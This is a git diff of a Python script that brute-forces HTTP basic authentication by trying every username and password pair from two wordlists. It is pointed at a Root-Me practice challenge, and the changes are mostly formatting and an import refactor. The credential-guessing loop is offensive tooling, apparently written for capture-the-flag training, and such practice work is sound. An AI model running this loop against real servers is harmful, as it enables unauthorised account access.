@@ -5,10 +5,8 @@ Script pour bruteforce une authentication basique HTTP
 import base64
 import requests
 import time
-
 from models.progressBar import ProgressBar
-
-headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"}
+from models.webRessource import headers_base as headers
 
 
 def creds_is_valid(url, login, password):
@@ -28,10 +26,10 @@ def bruteforce_basic_auth(url, user_wordlist, password_wordlist, tempo):
 
     with open(password_wordlist, 'r') as passFile:
         pass_list = [x.strip() for x in passFile.readlines()]
-    progBar = ProgressBar(len(user_list)*len(pass_list))
+    progBar = ProgressBar(len(user_list) * len(pass_list))
     for user in user_list:
         for password in pass_list:
-            x+=1
+            x += 1
             progBar.print_bar_progress(x)
             if creds_is_valid(url, user, password):
                 print('\r', end="")
@@ -44,7 +42,7 @@ def bruteforce_basic_auth(url, user_wordlist, password_wordlist, tempo):
 
 if __name__ == "__main__":
     url = "http://challenge01.root-me.org/web-serveur/ch3/"
-    #login = "admin"
-    #password = "admin"
-    #print(creds_is_valid(url, login, password))
-    print(bruteforce_basic_auth(url,'test_user.txt','test_pass.txt',1))
+    # login = "admin"
+    # password = "admin"
+    # print(creds_is_valid(url, login, password))
+    print(bruteforce_basic_auth(url, 'test_user.txt', 'test_pass.txt', 1))
